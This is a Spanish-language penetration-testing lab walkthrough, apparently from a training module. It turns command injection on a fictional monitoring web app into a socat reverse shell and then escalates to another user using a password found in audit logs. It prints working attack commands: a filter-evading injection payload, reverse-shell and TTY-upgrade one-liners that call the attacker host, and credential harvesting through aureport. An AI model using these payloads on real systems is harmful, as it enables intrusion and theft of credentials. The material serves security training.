Ahora que hemos enumerado y atacado exhaustivamente el perímetro externo y descubierto una gran cantidad de hallazgos, estamos listos para cambiar de marcha y enfocarnos en obtener acceso estable a la red interna. Según el documento SoW, si podemos lograr una entrada interna, el cliente quiere que veamos hasta dónde podemos llegar, incluyendo obtener acceso al nivel de `Domain Admin`. En la última sección, trabajamos arduamente en desglosar las capas y encontrar aplicaciones web que llevaron a la lectura temprana de archivos o la ejecución remota de código (Remote Code Execution), pero no nos llevaron a la red interna. Terminamos obteniendo RCE (Remote Code Execution) en la aplicación `monitoring.inlanefreight.local` después de una dura batalla contra los filtros y listas negras establecidos para intentar prevenir ataques de `Command Injection`.

---

## Getting a Reverse Shell

Podemos usar [Socat](https://linux.die.net/man/1/socat) para establecer una conexión reverse shell. Nuestro comando base será el siguiente, pero necesitaremos ajustarlo un poco para pasar los filtros:

```r
socat TCP4:10.10.14.5:8443 EXEC:/bin/bash
```

Podemos modificar este comando para darnos un payload para capturar un reverse shell.

```r
GET /ping.php?ip=127.0.0.1%0a's'o'c'a't'${IFS}TCP4:10.10.14.15:8443${IFS}EXEC:bash HTTP/1.1
Host: monitoring.inlanefreight.local
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36
Content-Type: application/json
Accept: */*
Referer: http://monitoring.inlanefreight.local/index.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=ntpou9fdf13i90mju7lcrp3f06
Connection: close
```

Inicia un `Netcat listener` en el puerto usado en el comando Socat (8443 aquí) y ejecuta la solicitud anterior en Burp Repeater. Si todo sale como se pretende, tendremos un reverse shell como el usuario `webdev`.

```r
nc -nvlp 8443

listening on [any] 8443 ...
connect to [10.10.14.15] from (UNKNOWN) [10.129.203.111] 51496
id
uid=1004(webdev) gid=1004(webdev) groups=1004(webdev),4(adm) 
```

A continuación, necesitaremos actualizar a un `interactive TTY`. Este [post](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/) describe algunos métodos. Podríamos usar un método que también se cubrió en la sección [Types of Shells](https://academy.hackthebox.com/module/77/section/725) del módulo `Getting Started`, ejecutando el conocido one-liner de Python (`python3 -c 'import pty; pty.spawn("/bin/bash")'`) para generar un pseudo-terminal. Pero vamos a intentar algo un poco diferente usando `Socat`. La razón para hacer esto es obtener un terminal adecuado para que podamos ejecutar comandos como `su`, `sudo`, `ssh`, `use command completion`, y `open a text editor if needed`.

Iniciaremos un Socat listener en nuestro host de ataque.

```r
socat file:`tty`,raw,echo=0 tcp-listen:4443
```

A continuación, ejecutaremos un one-liner de Socat en el host objetivo.

```r
nc -lnvp 8443

listening on [any] 8443 ...
connect to [10.10.14.15] from (UNKNOWN) [10.129.203.111] 52174
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.15:4443
```

Si todo sale según lo planeado, tendremos una conexión reverse shell estable en nuestro Socat listener.

```r
webdev@dmz01:/var/www/html/monitoring$ id

uid=1004(webdev) gid=1004(webdev) groups=1004(webdev),4(adm)
webdev@dmz01:/var/www/html/monitoring$
```

Ahora que tenemos un reverse shell estable, podemos comenzar a explorar el sistema de archivos. Los resultados del comando `id` son inmediatamente interesantes. La sección [Privileged Groups](https://academy.hackthebox.com/module/51/section/477) del módulo `Linux Privilege Escalation` muestra un ejemplo de usuarios en el grupo `adm` que tienen derechos para leer TODOS los logs almacenados en `/var/log`. Tal vez podamos encontrar algo interesante allí. Podemos usar [aureport](https://linux.die.net/man/8/aureport) para leer los logs de auditoría en sistemas Linux, con la página man describiéndolo como "aureport is a tool that produces summary reports of the audit system logs."

```r
webdev@dmz01:/var/www/html/monitoring$ aureport --tty | less

Error opening config file (Permission denied)
NOTE - using built-in logs: /var/log/audit/audit.log
WARNING: terminal is not fully functional
-  (press RETURN)
TTY Report
===============================================
# date time event auid term sess comm data
===============================================
1. 06/01/22 07:12:53 349 1004 ? 4 sh "bash",<nl>
2. 06/01/22 07:13:14 350 1004 ? 4 su "ILFreightnixadm!",<nl>
3. 06/01/22 07:13:16 355 1004 ? 4 sh "sudo su srvadm",<nl>
4. 06/01/22 07:13:28 356 1004 ? 4 sudo "ILFreightnixadm!"
5. 06/01/22 07:13:28 360 1004 ? 4 sudo <nl>
6. 06/01/22 07:13:28 361 1004 ? 4 sh "exit",<nl>
7. 06/01/22 07:13:36 364 1004 ? 4 bash "su srvadm",<ret>,"exit",<ret>
```

Después de ejecutar el comando, escribe `q` para volver a nuestra shell. Desde la salida anterior, parece que un usuario estaba intentando autenticarse como el usuario `srvadm`, y tenemos un posible par de credenciales `srvadm:ILFreightnixadm!`. Usando el comando `su`, podemos autenticarnos como el usuario `srvadm`.

```r
webdev@dmz01:/var/www/html/monitoring$ su srvadm

Password: 
$ id

uid=1003(srvadm) gid=1003(srvadm) groups=1003(srvadm)
$ /bin/bash -i

srvadm@dmz01:/var/www/html/monitoring$
```

Ahora que hemos superado filtros pesados para lograr command injection, convertir esa ejecución de código en un reverse shell, y escalado nuestros privilegios a otro usuario, no queremos perder el acceso a este host. En la siguiente sección, trabajaremos para lograr persistencia, idealmente después de escalar privilegios a `root`.